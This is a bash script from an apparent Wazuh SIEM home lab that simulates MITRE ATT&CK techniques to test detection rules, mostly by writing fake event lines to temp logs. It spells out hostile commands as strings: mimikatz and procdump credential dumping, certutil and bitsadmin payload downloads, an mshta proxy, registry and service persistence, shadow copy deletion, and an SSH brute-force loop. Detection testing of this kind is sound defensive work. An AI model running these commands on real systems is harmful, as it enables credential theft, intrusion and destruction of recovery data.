#!/usr/bin/env bash
# ==============================================================================
# Script Name: simulate_attacks.sh
# Author:      Ajit Nayak (SOC Analyst / Threat Detection Engineer)
# Repository:  wazuh-soc-home-lab
# Purpose:     Simulate MITRE ATT&CK techniques to trigger and validate Wazuh SIEM
#              and Sysmon detection rules in a controlled SOC home lab environment.
# ==============================================================================

set -euo pipefail

# ANSI Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Default Configuration
LOG_FILE="/tmp/wazuh_attack_simulation.log"
TARGET_HOST="127.0.0.1"
SSH_PORT="22"
RDP_PORT="3389"
WEB_PORT="8080"
DRY_RUN=false
SIMULATION_COUNT=0

# Log & Print Functions
log() {
    local level="$1"
    local msg="$2"
    local timestamp
    timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    echo -e "${timestamp} [${level}] ${msg}" >> "${LOG_FILE}" 2>/dev/null || true
}

info() {
    echo -e "${CYAN}[*] INFO:${NC} $1"
    log "INFO" "$1"
}

success() {
    echo -e "${GREEN}[+] SUCCESS:${NC} $1"
    log "SUCCESS" "$1"
}

warn() {
    echo -e "${YELLOW}[!] WARNING:${NC} $1"
    log "WARN" "$1"
}

alert() {
    echo -e "${RED}[!] SIMULATING ATTACK [MITRE $1]:${NC} $2"
    log "ATTACK-$1" "$2"
    ((SIMULATION_COUNT++)) || true
}

banner() {
    cat << "EOF"
  ██████╗ ███████╗████████╗███████╗███████╗████████╗██╗███╗   ██╗ ██████╗ 
 ██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝ 
 ██║  ███╗█████╗     ██║   ███████╗█████╗     ██║   ██║██╔██╗ ██║██║  ███╗
 ██║   ██║██╔══╝     ██║   ╚════██║██╔══╝     ██║   ██║██║╚██╗██║██║   ██║
 ╚██████╔╝███████╗   ██║   ███████║███████╗   ██║   ██║██║ ╚████║╚██████╔╝
  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
             WAZUH SIEM & XDR ADVERSARY SIMULATION FRAMEWORK
                Author: Ajit Nayak | Bangalore SOC Lab
EOF
    echo -e "${PURPLE}======================================================================${NC}"
    echo -e " Target Host: ${BOLD}${TARGET_HOST}${NC} | Dry Run: ${BOLD}${DRY_RUN}${NC} | Log: ${BOLD}${LOG_FILE}${NC}"
    echo -e "${PURPLE}======================================================================${NC}\n"
}

# ==============================================================================
# ATTACK MODULES
# ==============================================================================

# 1. MITRE T1059.001 - PowerShell Encoded Cradle & Scripting Execution
sim_powershell_execution() {
    alert "T1059.001" "Simulating Encoded PowerShell & Web Download Cradle"
    
    local cmd_b64="V3JpdGUtSG9zdCAnW1dBWlVILVRFU1RdIE9iZnVzY2F0ZWQgUG93ZXJTaGVsbCBFeGVjdXRpb24n"
    local simulated_ps_cmd="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ${cmd_b64}"
    
    info "Command: ${simulated_ps_cmd}"
    if [ "${DRY_RUN}" = false ]; then
        if command -v powershell.exe &>/dev/null; then
            powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Write-Output '[WAZUH-TEST] Suspicious PowerShell Spawned'" || true
        elif command -v pwsh &>/dev/null; then
            pwsh -NoP -NonI -Command "Write-Output '[WAZUH-TEST] Suspicious PowerShell Spawned'" || true
        else
            warn "PowerShell binary not found in current PATH. Log simulated payload for Wazuh agent trigger."
            echo "[SIMULATED_LOG] Process: powershell.exe Args: ${simulated_ps_cmd}" >> /tmp/wazuh_process_sim.log 2>/dev/null || true
        fi
    fi
    success "PowerShell Execution Simulation Completed (Wazuh Rule ID: 100024)"
}

# 2. MITRE T1003.001 / T1003.002 - Credential Dumping & LSASS Harvesting
sim_credential_dumping() {
    alert "T1003.001" "Simulating LSASS Memory Dumping & Mimikatz Execution"
    
    local mimikatz_cmd="mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
    local procdump_cmd="procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"
    local reg_dump_cmd="reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save /y"
    
    info "Simulating Mimikatz CLI: ${mimikatz_cmd}"
    info "Simulating ProcDump Memory Harvesting: ${procdump_cmd}"
    info "Simulating Registry SAM Hive Export: ${reg_dump_cmd}"
    
    if [ "${DRY_RUN}" = false ]; then
        # Safe mock telemetry creation
        echo "[SIMULATED_EVENT_1] $(date -u +"%Y-%m-%dT%H:%M:%SZ") win.eventdata.commandLine: ${mimikatz_cmd}" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
        echo "[SIMULATED_EVENT_2] $(date -u +"%Y-%m-%dT%H:%M:%SZ") win.eventdata.commandLine: ${procdump_cmd}" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
        echo "[SIMULATED_EVENT_3] $(date -u +"%Y-%m-%dT%H:%M:%SZ") win.eventdata.commandLine: ${reg_dump_cmd}" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
    fi
    success "Credential Dumping Simulation Completed (Wazuh Rule IDs: 100010, 100011, 100013)"
}

# 3. MITRE T1105 / T1218 - LOLBAS Ingress Tool Transfer (Certutil & Bitsadmin)
sim_lolbas_transfer() {
    alert "T1105" "Simulating LOLBAS File Staging via Certutil and BITSAdmin"
    
    local certutil_cmd="certutil.exe -urlcache -split -f http://${TARGET_HOST}/payload.bin C:\\Windows\\Temp\\payload.exe"
    local bitsadmin_cmd="bitsadmin.exe /transfer stagingJob /download /priority normal http://${TARGET_HOST}/malware.exe C:\\Windows\\Temp\\malware.exe"
    local mshta_cmd="mshta.exe javascript:eval(\"new ActiveXObject('WScript.Shell').Run('cmd /c calc',0,true);window.close()\")"
    
    info "Simulating Certutil Ingress: ${certutil_cmd}"
    info "Simulating BITSAdmin Transfer: ${bitsadmin_cmd}"
    info "Simulating MSHTA Script Proxy: ${mshta_cmd}"
    
    if [ "${DRY_RUN}" = false ]; then
        echo "[SIMULATED_EVENT] win.eventdata.image: C:\\Windows\\System32\\certutil.exe win.eventdata.commandLine: ${certutil_cmd}" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
        echo "[SIMULATED_EVENT] win.eventdata.image: C:\\Windows\\System32\\mshta.exe win.eventdata.commandLine: ${mshta_cmd}" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
    fi
    success "LOLBAS Transfer Simulation Completed (Wazuh Rule IDs: 100020, 100021, 100022)"
}

# 4. MITRE T1110.001 - Authentication Brute Force Burst (SSH / RDP / Web)
sim_brute_force() {
    alert "T1110.001" "Simulating Multi-Protocol Authentication Brute Force Burst"
    
    info "Executing 10 rapid failed authentication attempts against target: ${TARGET_HOST}"
    
    for i in {1..10}; do
        log "BRUTE-FORCE" "Attempt $i/10: user=root status=FAILED src_ip=${TARGET_HOST}"
        if [ "${DRY_RUN}" = false ]; then
            # Generate simulated syslog and application gateway failure
            echo "[AUTH_GATEWAY] $(date "+%b %d %H:%M:%S") status=FAILED user=admin src_ip=192.168.1.150 method=POST url=/api/v1/login reason=\"invalid_credentials\"" >> /tmp/wazuh_custom_auth.log 2>/dev/null || true
            # Attempt non-blocking SSH probe if network reachable
            if command -v sshpass &>/dev/null; then
                sshpass -p "WrongPassword$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 -p "${SSH_PORT}" "fakeuser$i@${TARGET_HOST}" 2>/dev/null || true
            fi
        fi
        sleep 0.1
    done
    success "Brute Force Burst Simulation Completed (Wazuh Rule IDs: 100030, 100032, 100034)"
}

# 5. MITRE T1082 / T1087 - System Reconnaissance & Privilege Discovery
sim_discovery_recon() {
    alert "T1082" "Simulating System Discovery & Local Group Enumeration"
    
    local discovery_commands=(
        "whoami /all"
        "net localgroup administrators"
        "net user /domain"
        "systeminfo"
        "route print"
        "quser"
    )
    
    for cmd in "${discovery_commands[@]}"; do
        info "Executing: ${cmd}"
        if [ "${DRY_RUN}" = false ]; then
            echo "[SIMULATED_EVENT] win.eventdata.commandLine: ${cmd}" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
        fi
    done
    success "Reconnaissance Simulation Completed (Wazuh Rule ID: 100028)"
}

# 6. MITRE T1547.001 / T1543 - Persistence via Registry Run Key & Windows Service
sim_persistence() {
    alert "T1547.001" "Simulating Persistence via Registry Run Key and Service Creation"
    
    local reg_persist="reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Updater /t REG_SZ /d \"C:\\\\Windows\\\\Temp\\\\backdoor.exe\" /f"
    local sc_persist="sc.exe create MaliciousUpdater binpath= \"C:\\Windows\\Temp\\svc.exe\" start= auto"
    
    info "Simulating Run Key Persistence: ${reg_persist}"
    info "Simulating Service Persistence: ${sc_persist}"
    
    if [ "${DRY_RUN}" = false ]; then
        echo "[SIMULATED_EVENT] win.eventdata.targetObject: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
        echo "[SIMULATED_EVENT] win.eventdata.commandLine: ${sc_persist}" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
    fi
    success "Persistence Simulation Completed (Sysmon Event IDs 12/13, Wazuh Rule ID: 100025)"
}

# 7. MITRE T1490 / T1562 - Defense Evasion & Shadow Copy Deletion
sim_defense_evasion() {
    alert "T1490" "Simulating Ransomware Shadow Copy Deletion & Recovery Invalidation"
    
    local vss_cmd="vssadmin.exe delete shadows /all /quiet"
    local bcd_cmd="bcdedit.exe /set {default} recoveryenabled No"
    
    info "Simulating Volume Shadow Deletion: ${vss_cmd}"
    info "Simulating BCD Edit Recovery Disable: ${bcd_cmd}"
    
    if [ "${DRY_RUN}" = false ]; then
        echo "[SIMULATED_EVENT] win.eventdata.commandLine: ${vss_cmd}" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
        echo "[SIMULATED_EVENT] win.eventdata.commandLine: ${bcd_cmd}" >> /tmp/wazuh_sysmon_sim.log 2>/dev/null || true
    fi
    success "Defense Evasion Simulation Completed (Wazuh Rule ID: 100027)"
}

# Clean Up Simulation Artifacts
cleanup() {
    info "Cleaning up simulation temporary logs and artifacts..."
    rm -f /tmp/wazuh_process_sim.log /tmp/wazuh_sysmon_sim.log /tmp/wazuh_custom_auth.log /tmp/wazuh_attack_simulation.log 2>/dev/null || true
    success "All lab test artifacts purged."
}

# Usage / Help
show_help() {
    echo -e "${BOLD}Usage:${NC} $0 [OPTIONS]"
    echo ""
    echo -e "${BOLD}Options:${NC}"
    echo "  --all                 Execute all attack simulation techniques in sequence"
    echo "  --powershell          Simulate T1059.001 Obfuscated PowerShell Execution"
    echo "  --credentials         Simulate T1003.001/T1003.002 Credential Dumping & LSASS access"
    echo "  --lolbas              Simulate T1105/T1218 Signed Binary Proxy Execution (Certutil, MSHTA)"
    echo "  --bruteforce          Simulate T1110 Multi-Protocol Brute Force Authentication Burst"
    echo "  --discovery           Simulate T1082/T1087 System & Account Reconnaissance"
    echo "  --persistence         Simulate T1547.001/T1543 Persistence via Registry & Services"
    echo "  --evasion             Simulate T1490/T1562 Shadow Copy Deletion & Defense Evasion"
    echo "  --target <IP>         Specify Target IP (Default: 127.0.0.1)"
    echo "  --dry-run             Print simulated actions without modifying disk or sending packets"
    echo "  --cleanup             Remove temporary simulation log files"
    echo "  -h, --help            Show this help menu"
    echo ""
    echo -e "${BOLD}Example:${NC}"
    echo "  $0 --all --target 192.168.1.100"
    echo "  $0 --credentials --dry-run"
}

# Parse Arguments
main() {
    if [ $# -eq 0 ]; then
        banner
        show_help
        exit 0
    fi

    local run_all=false
    local run_ps=false
    local run_cred=false
    local run_lolbas=false
    local run_bf=false
    local run_disc=false
    local run_pers=false
    local run_evas=false

    while [ $# -gt 0 ]; do
        case "$1" in
            --all)
                run_all=true
                shift
                ;;
            --powershell)
                run_ps=true
                shift
                ;;
            --credentials)
                run_cred=true
                shift
                ;;
            --lolbas)
                run_lolbas=true
                shift
                ;;
            --bruteforce)
                run_bf=true
                shift
                ;;
            --discovery)
                run_disc=true
                shift
                ;;
            --persistence)
                run_pers=true
                shift
                ;;
            --evasion)
                run_evas=true
                shift
                ;;
            --target)
                TARGET_HOST="$2"
                shift 2
                ;;
            --dry-run)
                DRY_RUN=true
                shift
                ;;
            --cleanup)
                cleanup
                exit 0
                ;;
            -h|--help)
                banner
                show_help
                exit 0
                ;;
            *)
                banner
                warn "Unknown argument: $1"
                show_help
                exit 1
                ;;
        esac
    done

    banner

    if [ "${run_all}" = true ]; then
        sim_powershell_execution
        echo ""
        sim_credential_dumping
        echo ""
        sim_lolbas_transfer
        echo ""
        sim_brute_force
        echo ""
        sim_discovery_recon
        echo ""
        sim_persistence
        echo ""
        sim_defense_evasion
    else
        [ "${run_ps}" = true ] && sim_powershell_execution && echo ""
        [ "${run_cred}" = true ] && sim_credential_dumping && echo ""
        [ "${run_lolbas}" = true ] && sim_lolbas_transfer && echo ""
        [ "${run_bf}" = true ] && sim_brute_force && echo ""
        [ "${run_disc}" = true ] && sim_discovery_recon && echo ""
        [ "${run_pers}" = true ] && sim_persistence && echo ""
        [ "${run_evas}" = true ] && sim_defense_evasion && echo ""
    fi

    echo -e "${PURPLE}======================================================================${NC}"
    echo -e "${GREEN}${BOLD}[✔] SIMULATION COMPLETE:${NC} Triggered ${BOLD}${SIMULATION_COUNT}${NC} MITRE ATT&CK technique modules."
    echo -e "Review Wazuh Dashboard (Threat Hunting & Security Events) for alert correlation."
    echo -e "${PURPLE}======================================================================${NC}"
}

main "$@"
